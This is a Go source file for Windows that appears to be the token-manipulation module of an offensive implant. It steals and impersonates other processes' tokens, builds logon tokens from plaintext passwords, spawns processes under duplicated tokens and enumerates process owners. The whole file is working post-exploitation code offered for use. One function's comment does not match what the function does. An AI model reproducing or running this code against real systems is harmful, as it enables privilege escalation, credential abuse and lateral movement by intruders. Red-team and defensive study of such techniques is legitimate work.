//go:build windows

package main

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	TOKEN_QUERY             = 0x0008
	TOKEN_DUPLICATE         = 0x0002
	TOKEN_ASSIGN_PRIMARY    = 0x0001
	TOKEN_IMPERSONATE       = 0x0004
	TOKEN_ALL_ACCESS        = 0xF01FF
	SecurityImpersonation   = 2
	TokenPrimary            = 1
	TokenImpersonation      = 2
	LOGON32_LOGON_NETWORK   = 3
	LOGON32_PROVIDER_DEFAULT = 0
	CREATE_NEW_CONSOLE      = 0x00000010
)

var (
	advapi32           = windows.NewLazySystemDLL("advapi32.dll")
	procOpenProcessToken   = advapi32.NewProc("OpenProcessToken")
	procDuplicateTokenEx   = advapi32.NewProc("DuplicateTokenEx")
	procImpersonateLoggedOnUser = advapi32.NewProc("ImpersonateLoggedOnUser")
	procRevertToSelf           = advapi32.NewProc("RevertToSelf")
	procLogonUserW             = advapi32.NewProc("LogonUserW")
	procCreateProcessWithTokenW = advapi32.NewProc("CreateProcessWithTokenW")
	procGetTokenInformation     = advapi32.NewProc("GetTokenInformation")
	procLookupAccountSidW       = advapi32.NewProc("LookupAccountSidW")
)

// impersonateProcess steals the primary token from a target PID and impersonates it.
// The current thread's security context will run as the target user.
func impersonateProcess(pid uint32) (string, error) {
	proc, err := windows.OpenProcess(
		windows.PROCESS_QUERY_INFORMATION, false, pid)
	if err != nil {
		return "", fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(proc)

	var hToken windows.Token
	r, _, e := procOpenProcessToken.Call(
		uintptr(proc),
		TOKEN_DUPLICATE|TOKEN_QUERY,
		uintptr(unsafe.Pointer(&hToken)),
	)
	if r == 0 {
		return "", fmt.Errorf("OpenProcessToken: %w", e)
	}
	defer windows.CloseHandle(windows.Handle(hToken))

	var dupToken windows.Handle
	r, _, e = procDuplicateTokenEx.Call(
		uintptr(hToken),
		TOKEN_ALL_ACCESS,
		0,
		SecurityImpersonation,
		TokenImpersonation,
		uintptr(unsafe.Pointer(&dupToken)),
	)
	if r == 0 {
		return "", fmt.Errorf("DuplicateTokenEx: %w", e)
	}
	defer windows.CloseHandle(dupToken)

	r, _, e = procImpersonateLoggedOnUser.Call(uintptr(dupToken))
	if r == 0 {
		return "", fmt.Errorf("ImpersonateLoggedOnUser: %w", e)
	}

	user := tokenUser(dupToken)
	return fmt.Sprintf("[+] Impersonating PID %d as %s", pid, user), nil
}

// makeToken creates a new logon session token using plaintext credentials.
// Useful when you have credentials but no matching process to steal from.
func makeToken(domain, username, password string) (string, error) {
	domainPtr, _ := windows.UTF16PtrFromString(domain)
	userPtr, _   := windows.UTF16PtrFromString(username)
	passPtr, _   := windows.UTF16PtrFromString(password)

	var hToken windows.Handle
	r, _, e := procLogonUserW.Call(
		uintptr(unsafe.Pointer(userPtr)),
		uintptr(unsafe.Pointer(domainPtr)),
		uintptr(unsafe.Pointer(passPtr)),
		LOGON32_LOGON_NETWORK,
		LOGON32_PROVIDER_DEFAULT,
		uintptr(unsafe.Pointer(&hToken)),
	)
	if r == 0 {
		return "", fmt.Errorf("LogonUserW: %w", e)
	}
	defer windows.CloseHandle(hToken)

	// Duplicate to impersonation token
	var impToken windows.Handle
	r, _, e = procDuplicateTokenEx.Call(
		uintptr(hToken),
		TOKEN_ALL_ACCESS, 0,
		SecurityImpersonation,
		TokenImpersonation,
		uintptr(unsafe.Pointer(&impToken)),
	)
	if r == 0 {
		return "", fmt.Errorf("DuplicateTokenEx: %w", e)
	}
	defer windows.CloseHandle(impToken)

	r, _, e = procImpersonateLoggedOnUser.Call(uintptr(impToken))
	if r == 0 {
		return "", fmt.Errorf("ImpersonateLoggedOnUser: %w", e)
	}
	return fmt.Sprintf("[+] Token created for %s\\%s", domain, username), nil
}

// revertToken drops the current impersonation and reverts to the process token.
func revertToken() string {
	r, _, e := procRevertToSelf.Call()
	if r == 0 {
		return fmt.Sprintf("[-] RevertToSelf: %v", e)
	}
	return "[+] Reverted to original token"
}

// spawnAsCurrentToken spawns a process using the current impersonation token.
// Requires SeAssignPrimaryTokenPrivilege (typically held by SYSTEM / high integrity).
func spawnAsCurrentToken(cmd string) (string, error) {
	// Get current thread token
	var hThread windows.Handle
	// Use current process token duplicated as primary
	hProc := windows.CurrentProcess()
	var hToken windows.Handle
	r, _, e := procOpenProcessToken.Call(
		uintptr(hProc),
		TOKEN_ALL_ACCESS,
		uintptr(unsafe.Pointer(&hToken)),
	)
	if r == 0 {
		return "", fmt.Errorf("OpenProcessToken(self): %w", e)
	}
	defer windows.CloseHandle(hToken)

	var primaryToken windows.Handle
	r, _, e = procDuplicateTokenEx.Call(
		uintptr(hToken),
		TOKEN_ALL_ACCESS, 0,
		SecurityImpersonation,
		TokenPrimary,
		uintptr(unsafe.Pointer(&primaryToken)),
	)
	if r == 0 {
		return "", fmt.Errorf("DuplicateTokenEx primary: %w", e)
	}
	defer windows.CloseHandle(primaryToken)
	_ = hThread

	si := &windows.StartupInfo{Cb: uint32(unsafe.Sizeof(windows.StartupInfo{}))}
	pi := &windows.ProcessInformation{}

	cmdPtr, _ := windows.UTF16PtrFromString(cmd)
	r, _, e = procCreateProcessWithTokenW.Call(
		uintptr(primaryToken),
		0, // LOGON_WITH_PROFILE = 0x1, LOGON_NETCREDENTIALS_ONLY = 0x2
		0,
		uintptr(unsafe.Pointer(cmdPtr)),
		CREATE_NEW_CONSOLE,
		0, 0,
		uintptr(unsafe.Pointer(si)),
		uintptr(unsafe.Pointer(pi)),
	)
	if r == 0 {
		return "", fmt.Errorf("CreateProcessWithTokenW: %w", e)
	}
	windows.CloseHandle(pi.Thread)
	windows.CloseHandle(pi.Process)

	return fmt.Sprintf("[+] Spawned '%s' as PID %d", cmd, pi.ProcessId), nil
}

// listTokens enumerates running processes and shows their associated user accounts.
func listTokens() string {
	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return fmt.Sprintf("[-] Snapshot: %v", err)
	}
	defer windows.CloseHandle(snap)

	out := "[+] PID\tUSER\n"
	entry := windows.ProcessEntry32{Size: uint32(unsafe.Sizeof(windows.ProcessEntry32{}))}
	for err = windows.Process32First(snap, &entry); err == nil; err = windows.Process32Next(snap, &entry) {
		proc, e2 := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, entry.ProcessID)
		if e2 != nil {
			continue
		}
		var tok windows.Handle
		procOpenProcessToken.Call(uintptr(proc), TOKEN_QUERY, uintptr(unsafe.Pointer(&tok)))
		windows.CloseHandle(proc)
		if tok == 0 {
			continue
		}
		user := tokenUser(tok)
		windows.CloseHandle(tok)
		out += fmt.Sprintf("    %d\t%s\n", entry.ProcessID, user)
	}
	return out
}

// tokenUser returns "DOMAIN\User" for an open token handle.
func tokenUser(tok windows.Handle) string {
	var needed uint32
	procGetTokenInformation.Call(uintptr(tok), 1, 0, 0, uintptr(unsafe.Pointer(&needed)))
	if needed == 0 {
		return "<unknown>"
	}
	buf := make([]byte, needed)
	r, _, _ := procGetTokenInformation.Call(uintptr(tok), 1,
		uintptr(unsafe.Pointer(&buf[0])), uintptr(needed), uintptr(unsafe.Pointer(&needed)))
	if r == 0 {
		return "<unknown>"
	}

	// TOKEN_USER starts with TOKEN_USER{ SID_AND_ATTRIBUTES{ Sid *SID, Attributes DWORD } }
	sidPtr := *(*uintptr)(unsafe.Pointer(&buf[0]))
	if sidPtr == 0 {
		return "<unknown>"
	}

	var nameLen, domLen uint32 = 256, 256
	name := make([]uint16, nameLen)
	dom  := make([]uint16, domLen)
	var sidUse uint32

	procLookupAccountSidW.Call(
		0, sidPtr,
		uintptr(unsafe.Pointer(&name[0])), uintptr(unsafe.Pointer(&nameLen)),
		uintptr(unsafe.Pointer(&dom[0])),  uintptr(unsafe.Pointer(&domLen)),
		uintptr(unsafe.Pointer(&sidUse)),
	)
	return windows.UTF16ToString(dom) + `\` + windows.UTF16ToString(name)
}
